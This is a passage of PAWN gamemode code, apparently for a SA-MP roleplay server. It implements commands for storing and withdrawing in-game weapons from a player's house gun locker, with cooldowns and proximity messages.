	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			new weaponsinlocker;
			for(new s = 0; s < 5; s++)
			{
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s] != 0)
				{
					weaponsinlocker++;
				}
			}
			new string[80];
			format(string, sizeof(string), "Gunlocker(s): %d/%d | Cash: $%d | Pot: %d | Crack: %d | Materials: %d", weaponsinlocker,HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade], HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney], HouseInfo[PlayerInfo[playerid][pHouse2]][hPot], HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack], HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not inside a house you own.");
	}
	return 1;
}

CMD:getgun(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new string[128], slot;

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse])
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

			if(sscanf(params, "d", slot))
			{
				new weaponname[50];
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				format(string, sizeof(string), "*** %s's Safe ***", GetPlayerNameEx(playerid));
		   		SendClientMessage(playerid, COLOR_WHITE, string);
				for(new s = 0; s < 5; s++)
				{
					if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s] != 0)
					{
						GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getgun [slot]");
				return 1;
			}

			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   You must wait %d seconds before getting another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
				return 1;
			}
			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] != 0)
			{
				new weaponname[50];
				GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1], weaponname, sizeof(weaponname));
				GivePlayerValidWeapon(playerid, HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1], 60000);
				HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] = 0;
				if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a silenced pistol from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a silenced pistol from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a Desert Eagle from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a Desert Eagle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a shotgun from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a shotgun from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a combat shotgun from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a combat shotgun from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an MP5 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an MP5 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an AK-47 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an AK-47 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an M4 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an M4 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a rifle from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a rifle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a sniper rifle from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn a sniper rifle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
                if(strcmp(weaponname, "micro smg", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an uzi from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn an uzi from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "tec9", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an uzi from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn an uzi from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "You don't have a weapon stored in that slot.");
				return 1;
			}
		}
	}
	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

			if(sscanf(params, "d", slot))
			{
				new weaponname[50];
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				format(string, sizeof(string), "*** %s's Safe ***", GetPlayerNameEx(playerid));
		   		SendClientMessage(playerid, COLOR_WHITE, string);
				for(new s = 0; s < 5; s++)
				{
					if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s] != 0)
					{
						GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getgun [slot]");
				return 1;
			}

			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   You must wait %d seconds before getting another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
				return 1;
			}
			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] != 0)
			{
				new weaponname[50];
				GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1], weaponname, sizeof(weaponname));
				GivePlayerValidWeapon(playerid, HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1], 60000);
				HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] = 0;
				if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a silenced pistol from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a silenced pistol from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a Desert Eagle from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a Desert Eagle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a shotgun from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a shotgun from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a combat shotgun from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a combat shotgun from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an MP5 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an MP5 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an AK-47 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an AK-47 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an M4 from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn an M4 from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a rifle from your gun locker.");
					format(string,sizeof(string), "* %s has withdrawn a rifle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a sniper rifle from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn a sniper rifle from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "micro smg", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an uzi from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn an uzi from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "tec9", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an uzi from your gun locker.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s has withdrawn an uzi from their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "You don't have a weapon stored in that slot.");
				return 1;
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not in any house");
	}
	return 1;
}

CMD:storegun(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
		return 1;
	}
	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /storegun [weapon] [slot]");

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   You must wait %d seconds before depositing another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}

			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
				return 1;
			}

			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] != 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "You have a weapon stored in that slot already.");
				return 1;
			}

			new weapon;
			if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a silenced pistol into your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s deposited their silenced pistol in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a Desert Eagle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s deposited their Desert Eagle in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a shotgun in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s deposited their Shotgun in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a combat shotgun in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s deposited their Combat Shotgun in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an MP5 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their MP5 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}

			else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an AK-47 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s deposited their AK-47 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an M4 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s deposited their M4 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a rifle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s deposited their riflein their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a sniper rifle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s deposited their sniper rifle in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "uzi", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 28 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an uzi in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their uzi in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "tec9", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 32 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a tec9 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their tec9 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "You don't have that weapon.");
			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] == 0)
			{
				HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] = weapon;
				RemovePlayerWeapon(playerid, weapon);
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
